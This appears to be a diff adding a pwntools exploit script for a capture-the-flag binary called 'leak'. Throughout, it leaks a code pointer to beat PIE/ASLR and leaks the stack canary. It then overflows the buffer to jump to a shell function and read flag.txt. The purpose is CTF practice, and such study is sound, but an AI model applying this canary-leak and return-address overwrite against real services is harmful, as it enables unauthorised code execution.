@@ -1,0 +1,120 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./leak", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=True, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# We will try to overflow the return address with that of 'givemeshellpls'. 
+# Importantly, since Canaries are enabled, we will have to leak those first.
+# Since PIE is supported by the binary, we will also have to beat ASLR.
+
+def main():
+    io = start()
+
+    # the only address we will need in the payload is the address to givemeshellpls:
+    # ~~this one is always the same apparently, as long as ASLR is disabled.~~
+    # > p givemeshell
+    shell_addr__ =      0x55a374ed1220
+    __libc_csu_init__ = 0x55a374ed1230
+    shell_offset = shell_addr__ - __libc_csu_init__
+
+    # to calculate even more offsets we can make use of some further values though:
+    # > stack
+    buf_ptr = 0x7fffffffdee0
+    # > info frame
+    saved_rip_ptr = 0x7fffffffdf18
+    # > canary
+    canary_ptr = 0x7fffffffdf08
+    master_canary_ptr = 0x7fffffffe329  # initially my idea was to overflow the master canary, 
+                                        # but this is not possible due to the limit of 0x400 bytes input
+
+    # the first sequence will be from the start of the buffer up until (excl.) the canary
+    # it is 40 byte long
+    pad_len_1 = canary_ptr - buf_ptr
+
+    # the second sequence will be from after the canary up until the master return address
+    # it is 8 bytes long
+    pad_len_2 = (saved_rip_ptr) - (canary_ptr + 8)
+
+    # we could have grabbed these numbers from Ghidra as well, but I found this to be the more fool proof variant
+
+    # anyway ...
+
+    # away with all the annoying 
+    _ = io.recvuntil("Welcome to the echo service!\n")
+
+    # first of all, we want to leak the address of __libc_csu_init in the bytes 16-24
+    # with that address we then calculate the address of givemeshell
+    injection = [b" "*16]
+    raw = b"".join(injection)
+    io.write(raw)
+    sleep(0.1)
+    data = io.recv()[16:22]
+    __libc_csu_init = int.from_bytes(data, "little")
+    shell_addr = __libc_csu_init + shell_offset
+    shell_addr_raw = struct.pack('<Q', shell_addr)
+
+    # further, we will eliminate nullbytes in the buffer up until the canary. That way, 
+    # in the response the program will also leak the canary.
+    # important is the absence of nullbytes in our input as well
+    # since the LSB of the canary are null, we write an additional byte, so the output doesn't end there.
+
+    inp1 = [b" "*(pad_len_1+1)]
+    inp1_raw = b"".join(inp1)
+    io.write(inp1_raw)
+    sleep(0.1)
+    # that leaves us (nearly) with the canary:
+    canary_nearly = io.recv()[-8:-1]
+    # extend the least signicant bytes as zerobytes
+    canary = b"".join([b"\0"*(8-len(canary_nearly))] + [canary_nearly])
+
+    # lets add everything together ...
+    # we also need to set the buffer to \n so the loop returns
+    injection = [b"\n"] + [b"\x00"*(pad_len_1 - 1)] + [canary] + [b"\x00"*pad_len_2] + [shell_addr_raw] + [b"\x00"*(8-len(shell_addr_raw))]
+    raw = b"".join(injection)
+
+    # ... and do a sanity check
+    if(len(raw) != (saved_rip_ptr+8 - buf_ptr)):
+        print("Yo dawg, something ain't right with your spaghetti!\n length: " 
+            +str(len(raw)) + "\n shoulda: " + str((saved_rip_ptr+8 - buf_ptr)))
+        exit(0xbadc0de) # code 222
+
+    # ... and check if our payload is <= than 0x400 bytes
+    if(len(raw) > 0x400):
+        print("Yo dawg, sadly the master canary is out of reach :(")
+        exit(223)
+    
+    # before sending our malicious payload on it's way
+    io.write(raw)
+    # and empty the buffer
+    data = io.recvuntil("\n\n")
+
+    # we should have a shell now, so lets just print the flag :)
+    command = b"cat flag.txt"
+    io.sendline(command)
+    while True:
+        data = io.recv()    
+        if "FLAG" in data.decode("utf-8"):
+            break
+    print(data.split()[-1].decode("utf-8"))
+
+
+if __name__ == "__main__":
+    main()
